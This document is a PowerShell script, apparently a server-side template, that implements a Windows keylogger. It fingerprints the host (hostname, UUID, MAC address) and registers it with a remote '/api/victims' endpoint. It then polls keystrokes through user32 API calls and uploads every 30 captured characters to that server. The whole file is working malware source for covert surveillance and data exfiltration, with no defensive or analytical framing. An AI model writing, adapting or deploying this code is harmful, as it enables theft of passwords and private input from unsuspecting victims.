#requires -Version 2
function Post-Data($Data, $Url){
  return Invoke-RestMethod -Uri $Url -Method POST -Body $Data
}

function Setup-Logging($Path="$env:temp\keys.txt"){
  # create output file
  $null = New-Item -Path $Path -ItemType File -Force

  $hostname = hostname
  $uuid = wmic csproduct get UUID | Select-Object -Index 2

  $lowestIndex = 100
  # get any physical network interface
  Get-NetAdapter -Physical | ForEach-Object {

    If ($lowestIndex -gt $_.ifIndex -and $_.Status -eq "Up")
    {
      $lowestIndex = $_.ifIndex
      $mac = $_.MacAddress
    }
  }
  
  $Data = @{
    macAddress = $mac
    uuid = $uuid
    hostname = $hostname
  }

  # write result into a file for later use
  $result = Post-Data -Data $Data -Url {{ baseURI }}/api/victims

  $result.id | Out-File $Path
  return $object.id
}

function Start-KeyLogger($MyID) 
{
  # Signatures for API Calls
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

  # load signatures and make members available
  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru

  # count keypresses
  $count = 0
  $log
  
  # create endless loop
  while (1) {
    Start-Sleep -Milliseconds 40
    
    # scan all ASCII codes above 8
    for ($ascii = 9; $ascii -le 254; $ascii++) {
      # get current key state
      $state = $API::GetAsyncKeyState($ascii)

      # is key pressed?
      if ($state -eq -32767) {
        $null = [console]::CapsLock

        # translate scan code to real code
        $virtualKey = $API::MapVirtualKey($ascii, 3)

        # get keyboard state for virtual keys
        $kbstate = New-Object Byte[] 256
        $checkkbstate = $API::GetKeyboardState($kbstate)

        # prepare a StringBuilder to receive input key
        $mychar = New-Object -TypeName System.Text.StringBuilder

        # translate virtual key
        $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

        if ($success) 
        {
          # add key to logger variable
          $log = "$log" + "$mychar";
          $count++

          if($count -eq 30){
            $data = @{keystrokes = $log}
            $null = Post-Data -Url {{ baseURI }}/api/victims/$id/logs -Data $data

            # reset counter and logged characters
            $count = 0
            $log = ""
          }
        }
      }
    }
  }
}

$idFilePath = "$env:temp\keys.txt"

if (Test-Path -Path $idFilePath) {
  $id = Get-Content $idFilePath
} else {
  $id = Setup-Logging -Path $idFilePath
}

Start-KeyLogger -MyID $id
